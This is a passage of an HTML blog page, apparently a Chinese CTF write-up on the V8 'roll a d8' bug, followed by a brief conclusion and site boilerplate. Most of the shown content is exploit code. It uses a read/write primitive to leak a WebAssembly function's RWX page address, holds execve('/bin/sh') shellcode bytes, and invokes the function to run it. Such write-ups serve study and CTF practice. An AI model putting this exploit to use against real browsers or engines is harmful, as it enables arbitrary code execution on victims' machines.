&#x2F; 0x10000000000) &#x3D;&#x3D;&#x3D; 0x7f)&#123;</span><br><span class="line">&#x2F;&#x2F; 			searched &#x3D; bk;</span><br><span class="line">&#x2F;&#x2F; 			break;</span><br><span class="line">&#x2F;&#x2F; 		&#125;</span><br><span class="line">&#x2F;&#x2F; 	&#125; else if(size &lt; 0x20) &#123;</span><br><span class="line">&#x2F;&#x2F; 		break;</span><br><span class="line">&#x2F;&#x2F; 	&#125;</span><br><span class="line">&#x2F;&#x2F; 	size &#x3D; parseInt(size &#x2F; 8) * 8</span><br><span class="line">&#x2F;&#x2F; 	curr_chunk +&#x3D; size;</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br><span class="line"></span><br><span class="line">var wasmCode &#x3D; new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">var wasmModule &#x3D; new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">var f &#x3D; wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">&#x2F;&#x2F; if(searched !&#x3D;&#x3D; 0)&#123;</span><br><span class="line">&#x2F;&#x2F; 	var libc_base &#x3D; parseInt((searched - 0x3c4000) &#x2F; 0x1000) * 0x1000;</span><br><span class="line">&#x2F;&#x2F; 	console.log(&quot;searched libc_base: 0x&quot; + libc_base.toString(16));</span><br><span class="line">&#x2F;&#x2F; &#125; else &#123;</span><br><span class="line">&#x2F;&#x2F; 	console.log(&quot;Not found&quot;)</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br><span class="line"></span><br><span class="line">var asm_addr &#x3D; arw.leak_obj(f);</span><br><span class="line"></span><br><span class="line">let sharedInfo &#x3D;arw.read(asm_addr+0x18)-1;</span><br><span class="line">let functionData&#x3D;arw.read(sharedInfo+0x8)-1;</span><br><span class="line">%DebugPrint(arw.read(functionData+0x70))</span><br><span class="line">let instanceAddr&#x3D;parseInt(arw.read(functionData+0x70)&#x2F;0x10000);</span><br><span class="line">%DebugPrint(instanceAddr)</span><br><span class="line">let sc &#x3D; [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; for(let i&#x3D;0;i&lt;sc.length;i++)&#123;</span><br><span class="line">&#x2F;&#x2F; 	arw.write(instanceAddr+i,sc[i]);</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br><span class="line">var shared_info_addr &#x3D; arw.read(asm_addr + 0x18) - 0x1;</span><br><span class="line">var wasm_exported_func_data_addr &#x3D; arw.read(shared_info_addr + 0x8) - 0x1;</span><br><span class="line">var wasm_instance_addr &#x3D; arw.read(wasm_exported_func_data_addr + 0x10) - 0x1;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; var wasm_instance_addr2 &#x3D; arw.leak_obj(wasmInstance);</span><br><span class="line">%DebugPrint(wasm_instance_addr);</span><br><span class="line">&#x2F;&#x2F; %SystemBreak();</span><br><span class="line">var rwx_page_addr &#x3D; arw.read(wasm_instance_addr + 0x88);</span><br><span class="line">%DebugPrint(rwx_page_addr)</span><br><span class="line"></span><br><span class="line">console.log(&quot;[*] leak rwx_page_addr: 0x&quot; + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; var shellcode &#x3D; [</span><br><span class="line">&#x2F;&#x2F;     0x2fbb485299583b6a,</span><br><span class="line">&#x2F;&#x2F;     0x5368732f6e69622f,</span><br><span class="line">&#x2F;&#x2F;     0x050f5e5457525f54</span><br><span class="line">&#x2F;&#x2F; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; arw.write(rwx_page_addr, shellcode[0])</span><br><span class="line">&#x2F;&#x2F; arw.write(rwx_page_addr, shellcode[1])</span><br><span class="line">&#x2F;&#x2F; arw.write(rwx_page_addr, shellcode[2])</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;%SystemBreak();</span><br><span class="line">f();</span><br><span class="line">console.log(&quot;end&quot;)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞利用并不是特别难，在分析的时候从大佬的博客中学到了很多新的东西。</p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>google 上能搜到的roll a d8 相关的博客都翻了一边，感谢各位大大的博客和exp。</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="/2021/06/19/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        browser-pwn cve-2020-6418漏洞分析 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By N1ko. All Rights Reserved.
+                </p>
+                <p>Theme By <a href="//go.kieran.top" target="_blank" rel="noopener" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/tinyniko" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/nikos233__" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
